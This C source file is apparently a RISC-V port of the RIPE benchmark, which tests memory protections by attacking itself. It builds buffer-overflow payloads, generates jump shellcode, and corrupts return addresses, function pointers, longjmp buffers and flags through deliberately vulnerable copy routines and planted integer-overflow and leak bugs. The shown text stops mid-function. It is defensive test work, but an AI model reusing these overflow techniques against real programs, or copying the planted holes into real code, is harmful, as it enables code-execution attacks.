/*
 * Standalone RISC-V compatible implementation of RIPE
 *
 * Attack params:
 * --------------
 * technique = direct, indirect
 * inject parameter = ret2libc, shellcode injection, ROP, data only
 * code pointer = return address, function pointer, vulnerable struct, longjmp buffer,
 *         non-control data variable
 * location = stack, heap, data, bss
 * function = memcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf,
 *         sscanf, homebrew memcpy
 */

#include "ripe_attack_generator.h"

static boolean output_debug_info = TRUE;

// JM: shellcode is generated in perform_attack()
char * shellcode_nonop[12];

// JM: data-only target pointer
uint32_t dop_dest = 0xdeadbeef;

// Do not count for the null terminator since a null in the shellcode will
// terminate any string function in the standard library
static size_t size_shellcode_nonop = 12;

/* DATA SEGMENT TARGETS */
/*
Vulnerable struct
Overflow buffers (buffer1 for .data, buffer2 for .sdata)
Arbitrary read data
DOP flag
Two general pointers for indirect attack
Function pointers
Longjmp buffer
*/
static struct attackme data_struct = { "AAAA", &dummy_function };
static char data_buffer1[256] = "d";
static char data_buffer2[8] = "dummy";
static char data_secret[32] = "success. Secret data leaked.\n";
static int data_flag = 0700;
static uint32_t * data_mem_ptr_aux[64] = { &dummy_function };
static uint32_t * data_mem_ptr[64] = { &dummy_function };
static int (* data_func_ptr)(const char *) = &dummy_function;
static jmp_buf data_jmp_buffer = { 1 };

// JM: control data destinations
void
shellcode_target();
void
ret2libc_target();
void
rop_target();
void
dop_target(char * buf, uint32_t auth);

// JM: contains buffer lower in memory than stack param, allowing for overflow
void
set_low_buf(char ** buf);

// JM: integer overflow vulnerability
void
iof(char * buf, uint32_t iv);

// JM: arbitrary read bug
void
data_leak(char *buf);

// JM: forces length param to register and jumps before return for stack param attacks
void
homebrew_memcpy_param(void * dst, const void * src, register size_t length);

// JM: longjmp() is called from here
void
lj_func(jmp_buf lj_buf);

// get ret address
// JM: ra written to stack one word higher than bp
#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void **) OLD_BP_PTR - 1)

static ATTACK_FORM attack;

void
try_attack(void)
{
    jmp_buf stack_jmp_buffer_param;

    // Check if attack is possible
    if (is_attack_possible()) {
        perform_attack(&dummy_function, stack_jmp_buffer_param);
    } else {
        exit(ATTACK_IMPOSSIBLE);
    }

}

//
// Initial main taking argument on the commande line has been replaced by a simple function call
// You have to update the ATTACK_NR to mimic the command line arguments
//
void
main(void)
{
#define ATTACK_NR   2

    printk("RIPE is alive! %s\n", CONFIG_BOARD);

#if ATTACK_NR == 1
	printk("-t direct -i shellcode -c funcptrheap -l heap -f memcpy");
    attack.technique = DIRECT; attack.inject_param = INJECTED_CODE_NO_NOP; attack.code_ptr= FUNC_PTR_HEAP; attack.location = HEAP;  attack.function = HOMEBREW;
#endif

#if ATTACK_NR == 2
	printk("-t direct -i shellcode -c longjmpstackparam -l stack -f homebrew");
    attack.technique = DIRECT; attack.inject_param = INJECTED_CODE_NO_NOP; attack.code_ptr= LONGJMP_BUF_STACK_VAR; attack.location = STACK;  attack.function = HOMEBREW;
#endif

#if ATTACK_NR == 3
	printk("-t indirect -i returnintolibc -c ret -l stack -f memcpy");
    attack.technique = INDIRECT; attack.inject_param = RETURN_INTO_LIBC; attack.code_ptr= RET_ADDR; attack.location = STACK;  attack.function = HOMEBREW;
#endif

#if ATTACK_NR == 4
	printk("-t indirect -i returnintolibc -c funcptrstackvar -l stack -f memcpy");
    attack.technique = INDIRECT; attack.inject_param = RETURN_INTO_LIBC; attack.code_ptr= FUNC_PTR_STACK_VAR; attack.location = STACK;  attack.function = HOMEBREW;
#endif

#if ATTACK_NR == 5
	printk("-t indirect -i shellcode -c funcptrheap -l heap -f memcpy");
    attack.technique = INDIRECT; attack.inject_param = INJECTED_CODE_NO_NOP; attack.code_ptr= STRUCT_FUNC_PTR_HEAP; attack.location = HEAP;  attack.function = HOMEBREW;
#endif

    try_attack();

    printf("Unexpected back in main\n");
    return 0;

}

/********************/
/* PERFORM_ATTACK() */
/********************/
void
perform_attack(
  int (*stack_func_ptr_param)(const char *),
  jmp_buf stack_jmp_buffer_param)
{
    jmp_buf stack_jmp_buffer;

	/* STACK TARGETS */
	/*
	Function Pointer
	Two general pointers for indirect attack
	DOP flag
	Arbitrary read data
	Overflow buffer
	Vulnerable struct
	*/
    int (* stack_func_ptr)(const char *);
    long * stack_mem_ptr;
    long * stack_mem_ptr_aux;
    int stack_flag;
	char stack_secret[32];
	strcpy(stack_secret, data_secret);
    char stack_buffer[1024];
    struct attackme stack_struct;
    stack_struct.func_ptr = &dummy_function;

    /* HEAP TARGETS */
	/*
	Vulnerable struct
	Overflow buffers
	DOP flag
	Two general pointers for indirect attack
	Arbitrary read data
	Function pointer array
	Longjmp buffer
	*/
    struct attackme * heap_struct =
      (struct attackme *) malloc(sizeof(struct attackme));
    heap_struct->func_ptr = dummy_function;

    /* Two buffers declared to be able to chose buffer that gets allocated    */
    /* first on the heap. The other buffer will be set as a target, i.e. a    */
    /* heap array of function pointers.                                       */
    char * heap_buffer1 = (char *) malloc(256 + sizeof(long));
    char * heap_buffer2 = (char *) malloc(256 + sizeof(long));
    char * heap_buffer3 = (char *) malloc(256 + sizeof(long));

    int * heap_flag = (int *) malloc(sizeof(int *));
    long * heap_mem_ptr_aux;
    long * heap_mem_ptr;
	char * heap_secret;
    int(**heap_func_ptr)(const char *) = 0;
    jmp_buf * heap_jmp_buffer;

    /* BSS TARGETS */
	/*
	Function pointer
	DOP flag
	Two general pointers for indirect attack
	Arbitrary read data
	Overflow buffer
	Longjmp buffer
	Vulnerable Struct
	*/
    static int (* bss_func_ptr)(const char *);
    static int * bss_flag;
    static long * bss_mem_ptr_aux;
    static long * bss_mem_ptr;
    static char bss_secret[32];
    static char bss_buffer[256];
    static jmp_buf bss_jmp_buffer;
    static struct attackme bss_struct;

    /* Pointer to buffer to overflow */
    char * buffer;
    /* Address to target for direct (part of) overflow */
    void * target_addr;
    /* JM: Address for second overflow (indirect ret2libc attack) */
    void * target_addr_aux;
    /* Buffer for storing a generated format string */
    char format_string_buf[16];
    /* Attack payload */
    CHARPAYLOAD payload;

    /* Check that malloc went fine */
    if (heap_buffer1 == NULL || heap_buffer2 == NULL) {
        printk("Unable to allocate heap memory.");
        exit(1);
    }

    // JM: assigning value to bss buffers
    //  to place them 'behind' other locals
    bss_buffer[0]  = 'a';
  	strcpy(bss_secret, data_secret);

    // write shellcode with correct jump address
    build_shellcode(shellcode_nonop);

    switch (attack.location) {
        case STACK:
            // NN: Special case for stack_struct
            if (attack.code_ptr == STRUCT_FUNC_PTR_STACK &&
              attack.technique == DIRECT)
            {
                buffer = stack_struct.buffer;
            } else if (attack.code_ptr == FUNC_PTR_STACK_PARAM &&
              attack.technique == DIRECT)
            {
                // JM: use buffer lower in memory for direct attack
                set_low_buf(&buffer);
            } else {
                buffer = stack_buffer;
            }

            // JM: enable data-only attack
            if (attack.inject_param == DATA_ONLY) {
                stack_mem_ptr = &stack_flag;
            }

            // Also set the location of the function pointer and the
            // longjmp buffer on the heap (the same since only choose one)
            heap_func_ptr   = (void *) heap_buffer1;
            heap_jmp_buffer = (void *) heap_buffer1;
            break;
        case HEAP:
            /* Injection into heap buffer                            */

            // NN: Special case for heap_struct
            if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP &&
              attack.technique == DIRECT)
            {
                buffer = heap_struct->buffer;
                break;
            }

            if (((unsigned long) heap_buffer1 < (unsigned long) heap_buffer2) &&
              ((unsigned long) heap_buffer2 < (unsigned long) heap_buffer3))
            {
                buffer = heap_buffer1;
                // Set the location of the memory pointer on the heap
                heap_mem_ptr_aux = (long *) heap_buffer2;
                heap_mem_ptr     = (long *) heap_buffer3;

				if (attack.code_ptr == VAR_LEAK) {
					heap_secret = heap_buffer2;
					strcpy(heap_secret, data_secret);
				}
                // Also set the location of the function pointer and the
                // longjmp buffer on the heap (the same since only choose one)
                heap_func_ptr = malloc(sizeof(void *));

                // allocate the jump buffer
                heap_jmp_buffer = (int *) malloc(sizeof(jmp_buf));
            } else {
                if (output_debug_info) {
                    fprintf(stderr,
                      "Error: Heap buffers allocated in the wrong order.\n");
                }

                exit(1);
            }

            // JM: set up heap ptr with DOP target
            if (attack.inject_param == DATA_ONLY) {
                heap_mem_ptr = heap_flag;
            }
            break;
        case DATA:
            /* Injection into data segment buffer                    */

            // NN: Special case for stack_struct
            if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
                buffer = data_struct.buffer;
                break;
            }

            if ((attack.code_ptr == FUNC_PTR_DATA ||
              attack.code_ptr == VAR_BOF) &&
              attack.technique == DIRECT)
            {
                buffer = data_buffer2;
            } else {
                buffer = data_buffer1;
            }

            // JM: set up data ptr with DOP target
            if (attack.inject_param == DATA_ONLY) {
                data_flag     = 0;
                *data_mem_ptr = &data_flag;
            }
            // Also set the location of the function pointer and the
            // longjmp buffer on the heap (the same since only choose one)
            heap_func_ptr   = (void *) heap_buffer1;
            heap_jmp_buffer = heap_buffer1;
            break;
        case BSS:
            /* Injection into BSS buffer                             */

            // NN: Special case for bss_struct
            if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
                buffer = bss_struct.buffer;
                break;
            }

            buffer = bss_buffer;

            bss_flag = 0;

            bss_mem_ptr_aux = &dummy_function;
            bss_mem_ptr     = &dummy_function;

            // JM: set up bss ptr with DOP target
            if (attack.inject_param == DATA_ONLY) {
                bss_mem_ptr = &bss_flag;
            }
            // Also set the location of the function pointer and the
            // longjmp buffer on the heap (the same since only choose one)
            heap_func_ptr = (void *) heap_buffer1;
            break;
    }

    // make sure we actually have an initialized function pointer on the heap
    if (heap_func_ptr)
        *heap_func_ptr = dummy_function;

    // Set Target Address
    switch (attack.technique) {
        case DIRECT:
            switch (attack.code_ptr) {
                case RET_ADDR:
                    target_addr = RET_ADDR_PTR;
                    break;
                case FUNC_PTR_STACK_VAR:
                    target_addr = &stack_func_ptr;
                    break;
                case FUNC_PTR_STACK_PARAM:
                    target_addr = &stack_func_ptr_param;
                    break;
                case FUNC_PTR_HEAP:
                    target_addr = heap_func_ptr;
                    break;
                case FUNC_PTR_BSS:
                    target_addr = &bss_func_ptr;
                    break;
                case FUNC_PTR_DATA:
                    target_addr = &data_func_ptr;
                    break;
                case LONGJMP_BUF_STACK_VAR:
                    target_addr = stack_jmp_buffer;
                    break;
                case LONGJMP_BUF_STACK_PARAM:
                    target_addr = stack_jmp_buffer_param;
                    break;
                case LONGJMP_BUF_HEAP:
                    target_addr = (void *) heap_jmp_buffer;
                    break;
                case LONGJMP_BUF_DATA:
                    target_addr = data_jmp_buffer;
                    break;
                case LONGJMP_BUF_BSS:
                    target_addr = bss_jmp_buffer;
                    break;
                case STRUCT_FUNC_PTR_STACK:
                    target_addr = &stack_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_HEAP:
                    target_addr = (void *) heap_struct + 256;
                    break;
                case STRUCT_FUNC_PTR_DATA:
                    target_addr = &data_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_BSS:
                    target_addr = &bss_struct.func_ptr;
                    break;
                case VAR_BOF:
                // JM: if data-only, location determines target
                case VAR_IOF:
                    switch (attack.location) {
                        case STACK:
                            target_addr = &stack_flag;
                            break;
                        case HEAP:
                            target_addr = heap_flag;
                            break;
                        case DATA:
                            target_addr = &data_flag;
                            break;
                        case BSS:
                            target_addr = &bss_flag;
                            break;
                    }
                    break;
				case VAR_LEAK:
                    switch (attack.location) {
                        case STACK:
                            target_addr = &stack_secret;
                            break;
                        case HEAP:
                            target_addr = heap_secret;
                            break;
                        case DATA:
                            target_addr = &data_secret;
                            break;
                        case BSS:
                            target_addr = &bss_secret;
                            break;
                    }
                    break;
					
            }
            break;

        case INDIRECT:
            switch (attack.location) {
                case STACK:
                    target_addr     = &stack_mem_ptr;
                    target_addr_aux = &stack_mem_ptr_aux;
                    break;
                case HEAP:
                    target_addr     = heap_mem_ptr;
                    target_addr_aux = heap_mem_ptr_aux;
                    break;
                case DATA:
                    target_addr     = &data_mem_ptr;
                    target_addr_aux = &data_mem_ptr_aux;
                    break;
                case BSS:
                    target_addr     = &bss_mem_ptr;
                    target_addr_aux = &bss_mem_ptr_aux;
                    break;
            }
            break;
    }

    // set longjmp buffers
    switch (attack.code_ptr) {
        case LONGJMP_BUF_STACK_VAR:
            if (setjmp(stack_jmp_buffer) != 0) {
                /* setjmp() returns 0 if returning directly and non-zero when returning */
                /* from longjmp() using the saved context. Attack failed.               */
                printf("Longjmp attack failed. Returning normally...\n");
                return;
            }
            payload.jmp_buffer = &stack_jmp_buffer;
            break;
        case LONGJMP_BUF_STACK_PARAM:
            if (setjmp(stack_jmp_buffer_param) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
            }
            payload.jmp_buffer = &stack_jmp_buffer_param;
            break;
        case LONGJMP_BUF_HEAP:
            if (setjmp(*heap_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return;
            }
            payload.jmp_buffer = (void *) heap_jmp_buffer;
            payload.stack_jmp_buffer_param = NULL;
            break;
        case LONGJMP_BUF_DATA:
            if (setjmp(data_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return;
            }
            payload.jmp_buffer = (void *) data_jmp_buffer;
            payload.stack_jmp_buffer_param = NULL;
            break;
        case LONGJMP_BUF_BSS:
            if (setjmp(bss_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return;
            }
            payload.jmp_buffer = (void *) bss_jmp_buffer;
            payload.stack_jmp_buffer_param = NULL;
            break;
        default:
            break;
    }

    payload.ptr_to_correct_return_addr = RET_ADDR_PTR;

    payload.inject_param = attack.inject_param;

    switch (attack.technique) {
        case DIRECT:
            switch (attack.inject_param) {
                case RETURN_INTO_LIBC:
                    // JM: simulate ret2libc by invoking mock libc function
                    payload.overflow_ptr = &ret2libc_target;
                    break;
                case RETURN_ORIENTED_PROGRAMMING:
                    // skip over the prologue code of rop_target
                    // to simulate return-oriented programming gadget
                    payload.overflow_ptr = (uintptr_t) &rop_target + 16;
                    break;
                case INJECTED_CODE_NO_NOP:
                    payload.overflow_ptr = buffer;
                    break;
                case DATA_ONLY:
                    // JM: corrupt variable with nonzero value
                    payload.overflow_ptr = 0xdeadbeef;
                    break;
                default:
                    if (output_debug_info) {
                        fprintf(stderr, "Unknown choice of attack code");
                        exit(1);
                    }
            }
            break;
        case INDIRECT:
            /* Here payload.overflow_ptr will point to the final pointer target   */
            /* since an indirect attack first overflows a general pointer that in */
            /* turn is dereferenced to overwrite the target pointer               */
            switch (attack.code_ptr) {
                case RET_ADDR:
                    payload.overflow_ptr = RET_ADDR_PTR;
                    break;
                case FUNC_PTR_STACK_VAR:
                    payload.overflow_ptr = &stack_func_ptr;
                    break;
                case FUNC_PTR_STACK_PARAM:
                    payload.overflow_ptr = &stack_func_ptr_param;
                    break;
                case FUNC_PTR_HEAP:
                    payload.overflow_ptr = heap_func_ptr;
                    break;
                case FUNC_PTR_BSS:
                    payload.overflow_ptr = &bss_func_ptr;
                    break;
                case FUNC_PTR_DATA:
                    payload.overflow_ptr = &data_func_ptr;
                    break;
                case STRUCT_FUNC_PTR_STACK:
                    payload.overflow_ptr = &stack_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_HEAP:
                    payload.overflow_ptr = (void *) heap_struct + 256;
                    break;
                case STRUCT_FUNC_PTR_DATA:
                    payload.overflow_ptr = &data_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_BSS:
                    payload.overflow_ptr = &bss_struct.func_ptr;
                    break;
                case LONGJMP_BUF_STACK_VAR:
                    payload.overflow_ptr = stack_jmp_buffer;
                    break;
                case LONGJMP_BUF_STACK_PARAM:
                    payload.overflow_ptr = stack_jmp_buffer_param;
                    break;
                case LONGJMP_BUF_HEAP:
                    payload.overflow_ptr = *heap_jmp_buffer;
                    break;
                case LONGJMP_BUF_DATA:
                    payload.overflow_ptr = data_jmp_buffer;
                    break;
                case LONGJMP_BUF_BSS:
                    payload.overflow_ptr = bss_jmp_buffer;
                    break;
				// JM: indirect attacks don't apply to int overflows or leaks
                case VAR_BOF:
                case VAR_IOF:
				case VAR_LEAK:
                    payload.overflow_ptr = &dop_dest;
                    break;
                default:
                    if (output_debug_info) {
                        fprintf(stderr,
                          "Error: Unknown choice of code pointer\n");
                    }

                    exit(1);
                    break;
            }
            break;
    }

    if (output_debug_info) {
        fprintf(stderr, "target_addr == %p\n", target_addr);
        fprintf(stderr, "buffer == %p\n", buffer);
    }

    // ------------------------------------------------------
    /* Calculate payload size for overflow of chosen target address */
    if ((unsigned long) target_addr > (unsigned long) buffer) {
        payload.size =
          (unsigned int) ((unsigned long) target_addr + sizeof(long)
          - (unsigned long) buffer
          + 1); /* For null termination so that buffer can be     */
                /* used with string functions in standard library */

        if (output_debug_info)
            fprintf(stderr, "payload size == %d\n", payload.size);
    } else {
        if (output_debug_info)
            fprintf(stderr, "Error calculating size of payload\n");
        exit(1);
    }

    /* Set first byte of buffer to null to allow concatenation functions to */
    /* start filling the buffer from that first byte                        */
    buffer[0] = '\0';

    if (!build_payload(&payload)) {
        if (output_debug_info)
            fprintf(stderr, "Error: Could not build payload\n");
        exit(1);
    }

    /****************************************/
    /* Overflow buffer with chosen function */
    /* Note: Here memory will be corrupted  */
    /****************************************/

    switch (attack.function) {
        case MEMCPY:
            // memcpy() shouldn't copy the terminating NULL, therefore - 1
            memcpy(buffer, payload.buffer, payload.size - 1);
            break;
        case STRCPY:
            strcpy(buffer, payload.buffer);
            break;
        case STRNCPY:
            strncpy(buffer, payload.buffer, payload.size);
            break;
        case SPRINTF:
            sprintf(buffer, "%s", payload.buffer);
            break;
        case SNPRINTF:
            snprintf(buffer, payload.size, "%s", payload.buffer);
            break;
        case STRCAT:
            strcat(buffer, payload.buffer);
            break;
        case STRNCAT:
            strncat(buffer, payload.buffer, payload.size);
            break;
        case SSCANF:
            snprintf(format_string_buf, 15, "%%%ic", payload.size);
            // Removed for now sscanf(payload.buffer, format_string_buf, buffer);
            break;
        case HOMEBREW:
            homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
            break;
        default:
            if (output_debug_info)
                fprintf(stderr, "Error: Unknown choice of function\n");
            exit(1);
            break;
    }

    /*******************************************/
    /* Ensure that code pointer is overwritten */
    /*******************************************/

    switch (attack.technique) {
        case DIRECT:
            /* Code pointer already overwritten */
            break;
        case INDIRECT:
            // JM: zero out junk byte written to general pointer
            if (attack.function == SSCANF) {
                *(uint32_t *) target_addr <<= 8;
                *(uint32_t *) target_addr >>= 8;
            }

            if (attack.inject_param == RETURN_INTO_LIBC) {
                // JM: auxilliary overflow to give attacker control of a second general ptr
                payload.overflow_ptr = &ret2libc_target;
                payload.size         = (uintptr_t) target_addr_aux
                  - (uintptr_t) buffer + sizeof(long) + 1;
                build_payload(&payload);
                memcpy(buffer, payload.buffer, payload.size - 1);
                printf("target_addr_aux: %p\n", target_addr_aux);

                switch (attack.location) {
                    case STACK:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) stack_mem_ptr_aux;
                        break;
                    case HEAP:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) *heap_mem_ptr_aux;
                        break;
                    case DATA:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) *data_mem_ptr_aux;
                        break;
                    case BSS:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) bss_mem_ptr_aux;
                        break;
                }
            } else if (attack.inject_param == INJECTED_CODE_NO_NOP) {
                *(uintptr_t *) (*(uintptr_t *) target_addr) =
                  (uintptr_t) buffer;
            }
            break;
        default:
            if (output_debug_info)
                fprintf(stderr, "Error: Unknown choice of attack parameterB\n");

            exit(1);
            break;
    }

    printf("");
    printf("\nExecuting attack... ");

    switch (attack.code_ptr) {
        case RET_ADDR:
            break;
        case FUNC_PTR_STACK_VAR:
            stack_func_ptr(NULL);
            break;
        case FUNC_PTR_STACK_PARAM:
            ((int (*)(char *, int))(*stack_func_ptr_param))(NULL, 0);
            break;
        case FUNC_PTR_HEAP:
            ((int (*)(char *, int)) * heap_func_ptr)(NULL, 0);
            break;
        case FUNC_PTR_BSS:
            ((int (*)(char *, int))(*bss_func_ptr))(NULL, 0);
            break;

        case FUNC_PTR_DATA:
            ((int (*)(char *, int))(*data_func_ptr))(NULL, 0);
            break;
        case LONGJMP_BUF_STACK_VAR:
            lj_func(stack_jmp_buffer);
            break;
        case LONGJMP_BUF_STACK_PARAM:
            lj_func(stack_jmp_buffer_param);
            break;
        case LONGJMP_BUF_HEAP:
            lj_func(*heap_jmp_buffer);
            break;
        case LONGJMP_BUF_DATA:
            lj_func(data_jmp_buffer);
            break;
        case LONGJMP_BUF_BSS:
            lj_func(bss_jmp_buffer);
            break;
        case STRUCT_FUNC_PTR_STACK:
            ((int (*)(char *, int)) * (stack_struct.func_ptr))(NULL, 0);
            break;
        case STRUCT_FUNC_PTR_HEAP:
            (*heap_struct->func_ptr)(NULL, 0);
            break;
        case STRUCT_FUNC_PTR_DATA:
            (*data_struct.func_ptr)(NULL, 0);
            break;
        case STRUCT_FUNC_PTR_BSS:
            (*bss_struct.func_ptr)(NULL, 0);
            break;
        case VAR_BOF:
        case VAR_IOF:
            switch (attack.location) {
                case STACK:
                    dop_target(buffer, *stack_mem_ptr);
                    break;
                case HEAP:
                    dop_target(buffer, *heap_mem_ptr);
                    break;
                case DATA:
                    dop_target(buffer, **data_mem_ptr);
                    break;
                case BSS:
                    dop_target(buffer, *bss_mem_ptr);
                    break;
            }
            break;
		case VAR_LEAK:
			data_leak(buffer);
			break;
    }
} /* perform_attack */

/*******************/
/* BUILD_PAYLOAD() */
/*******************/
boolean
build_payload(CHARPAYLOAD * payload)
{
    size_t size_shellcode, bytes_to_pad;
    char * shellcode, * temp_char_buffer, * temp_char_ptr;
    
	switch (attack.inject_param) {
        case INJECTED_CODE_NO_NOP:
            if (payload->size < (size_shellcode_nonop + sizeof(long))) {
                return FALSE;
            }
            shellcode      = shellcode_nonop;
            size_shellcode = size_shellcode_nonop;
            break;
        case DATA_ONLY:
            // JM: 256 padding bytes for unsigned 8bit IOF
            if (attack.code_ptr == VAR_IOF)
                payload->size = 256 + sizeof(long) + sizeof(char);
			
			if (attack.code_ptr == VAR_LEAK) {
				// JM: simulated packet with length included
				payload->size += 32 - sizeof(long);
				payload->buffer[0] = payload->size & 0xFF;
				payload->buffer[1] = payload->size / 0x100;
				payload->buffer[2] = 'A';
				payload->buffer[3] = '\0';
				payload->size = 4;
				return TRUE;
			}
        case RETURN_ORIENTED_PROGRAMMING:
        case RETURN_INTO_LIBC:
            if (payload->size < sizeof(long))
                return FALSE;

            size_shellcode = 0;
            shellcode      = "dummy";
            break;
    }
    /* Allocate payload buffer */
    payload->buffer = (char *) malloc(payload->size);
    if (payload->buffer == NULL) {
        if (output_debug_info)
            printk("Unable to allocate payload buffer.");
        return FALSE;
    }

    /* Copy shellcode into payload buffer */
    memcpy(payload->buffer, shellcode, size_shellcode);

    /* Calculate number of bytes to pad with */
    /* size - shellcode - target address - null terminator */
    bytes_to_pad =
      (payload->size - size_shellcode - sizeof(long) - sizeof(char));

    /* Pad payload buffer with dummy bytes */
    memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);

    if (output_debug_info) {
        fprintf(stderr, "bytes to pad: %d\n", bytes_to_pad);
        fprintf(stderr, "\noverflow_ptr: %p\n", payload->overflow_ptr);
    }

    /* Add the address to the direct or indirect target */
    if (attack.code_ptr != VAR_IOF) {
        memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
          &payload->overflow_ptr,
          sizeof(long));
    }

    /* Finally, add the terminating null character at the end */
    memset((payload->buffer + payload->size - 1), '\0', 1);
    
	if (output_debug_info)
        fprintf(stderr, "payload: %s\n", payload->buffer);
    return TRUE;

	
} /* build_payload */

// JM: call longjmp on a buffer in perform_attack()
void
lj_func(jmp_buf lj_buf)
{
    longjmp(lj_buf, 1111);
}

void
homebrew_memcpy(void * dst, const void * src, size_t length)
{
    char * d, * s;

    d = (char *) dst;
    s = (char *) src;

    while (length--) {
        *d++ = *s++;
    }
}

void
shellcode_target()
{
    printf("success.\nCode injection function reached.\n");
    exit(0);
}

void
ret2libc_target()
{
    printf("success.\nRet2Libc function reached.\n");
    exit(0);
}

void
dop_target(char * buf, uint32_t auth)
{
    size_t auth_loc = auth;

    if (attack.code_ptr == VAR_IOF) {
        iof(buf, &auth_loc);
    }

    if (!auth_loc) {
        printf("DOP attack failed\n");
    } else {
        printf("success.\nDOP memory corruption reached.\n");
        exit(0);
    }
}

void
rop_target()
{
    printf("success.\nROP function reached.\n");
    exit(0);
}

void
set_low_buf(char ** buf)
{
    char low_buf[1024];

    if (output_debug_info)
        fprintf(stderr, "Inside set_low_buf()\n");
    *buf = &low_buf;
}

void
iof(char * buf, uint32_t iv)
{
    char * map;
    uint32_t key = iv;
    uint8_t len  = strlen(buf);

    // 0-length allocation and vulenrable hash operations
    map      = (char *) malloc(len * sizeof(char));
    key     -= (uint32_t) map;
    key     &= (uint16_t) len - 1;
    map[key] = 0xa1;
}

void
data_leak(char *buf) {
	uint16_t size = buf[0] + (buf[1] * 0x100), i;
	char *msg = (char *)malloc(size);

	memcpy(msg, buf + 2, size);
	for (i = 0; i < size; i++) {
		if (msg[i] >= 0x20) printf("%c",msg[i]);
	}

	printf("\n");
}			

/*********************/
/* BUILD_SHELLCODE() */
/*********************/
void
build_shellcode(char * shellcode)
{
    char attack_addr[9], low_bits[4], high_bits[6];  // target address and its components
    char lui_bin[33], addi_bin[33];                  // binary insn encodings (as strings)
    char lui_s[9], addi_s[9], * jalr_s = "000300e7"; // hex insn encodings
    size_t lui_val, addi_val, jalr_val;              // raw binary insn encodings

    memset(attack_addr, 0, sizeof(attack_addr) );
    memset(low_bits,    0, sizeof(low_bits) );
    memset(high_bits,   0, sizeof(high_bits) );
    memset(lui_bin,     0, sizeof(lui_bin) );
    memset(addi_bin,    0, sizeof(addi_bin) );
    memset(lui_s,       0, sizeof(lui_s) );
    memset(addi_s,      0, sizeof(addi_s) );

	// fix shellcode when lower bits become negative
	if (((unsigned long)&shellcode_target & 0x00000fff) >= 0x800)
		hex_to_string(attack_addr, &shellcode_target + 0x1000);
    else
		hex_to_string(attack_addr, &shellcode_target);

    // split attack address into low and high bit strings
    strncpy(low_bits, &attack_addr[5], 3);
    strncpy(high_bits, attack_addr, 5);

    jalr_val = strtoul(jalr_s, 0, 16);

    // generate 20 imm bits for the LUI insn
    for (int i = 0; i < 5; i++) {
        strncat(lui_bin, hex_to_bin(high_bits[i]), 4);
    }

    // append reg and opcode bits, then convert to raw binary
    strncat(lui_bin, "001100110111", 12);
    lui_val = strtoul(lui_bin, 0, 2);

    hex_to_string(lui_s, lui_val);

    // generate binary for ADDI insn
    for (int i = 0; i < 3; i++) {
        strncat(addi_bin, hex_to_bin(low_bits[i]), 4);
    }

    strncat(addi_bin, "00110000001100010011", 20);
    addi_val = strtoul(addi_bin, 0, 2);

    hex_to_string(addi_s, addi_val);

    format_instruction(shellcode, lui_val);
    format_instruction(shellcode + 4, addi_val);
    format_instruction(shellcode + 8, jalr_val);

    hex_to_string(lui_s, lui_val);
    hex_to_string(addi_s, addi_val);

    if (output_debug_info) {
        printf("----------------\nShellcode instructions:\n");
        printf("%s0x%-20s%14s\n", "lui t1,  ", high_bits, lui_s);
        printf("%s0x%-20s%10s\n", "addi t1, t1, ", low_bits, addi_s);
        printf("%s%38s\n----------------\n", "jalr t1", jalr_s);
    }
} /* build_shellcode */

// convert a 32-bit hex value to padded, 8-char string
void
hex_to_string(char * str, size_t val)
{
    // store value in string and prepend 0s as necessary
    snprintf(str, 9, "%8x", val);

    for (int i = 0; i < 9; i++) {
        if (str[i] == ' ') str[i] = '0';
    }
}

// format instruction and append to destination string
void
format_instruction(char * dest, size_t insn)
{
    char insn_bytes[4];

    insn_bytes[0] = (insn >> 24) & 0xff;
    insn_bytes[1] = (insn >> 16) & 0xff;
    insn_bytes[2] = (insn >> 8) & 0xff;
    insn_bytes[3] = insn & 0xff;

    for (int i = 3; i >= 0; i--) {
        dest[3 - i] = insn_bytes[i];
    }
}

boolean
is_attack_possible()
{
    if ((attack.inject_param == INJECTED_CODE_NO_NOP) &&
      (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)))
    {
        fprintf(stderr,
          "Error: Impossible to inject shellcode with string functions (for now)\n");
        return FALSE;
    }

    if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING &&
      attack.technique != DIRECT)
    {
        fprintf(stderr,
          "Error: Impossible (theoretically) to perform indirect ROP attacks\n");
        return FALSE;
    }

    if (attack.inject_param == DATA_ONLY) {
        if (attack.code_ptr != VAR_BOF &&
          	attack.code_ptr != VAR_IOF &&
			attack.code_ptr != VAR_LEAK)
        {
            fprintf(stderr, "Error: Misused DOP code pointer parameters.\n");
			return FALSE;
        }

        if ((attack.code_ptr == VAR_LEAK || attack.code_ptr == VAR_IOF) && attack.technique == INDIRECT) {
            fprintf(stderr,
              "Error: Impossible to do an indirect int overflow attack.\n");
			return FALSE;
        }

        if (attack.location == HEAP && attack.technique == INDIRECT) {
            fprintf(stderr,
              "Error: Impossible to indirect attack the heap flag.\n");
        	return FALSE;
		}
    } else if (attack.code_ptr == VAR_BOF ||
			   attack.code_ptr == VAR_IOF ||
			   attack.code_ptr == VAR_LEAK) {
        fprintf(stderr,
          "Error: Must use \"dataonly\" injection parameter for DOP attacks.\n");
    	return FALSE;
	}

    // JM: attacks targeting another memory location must be indirect
    switch (attack.location) {
        case STACK:
            if ((attack.technique == DIRECT)) {
                if ((attack.code_ptr == FUNC_PTR_HEAP) ||
                  (attack.code_ptr == FUNC_PTR_BSS) ||
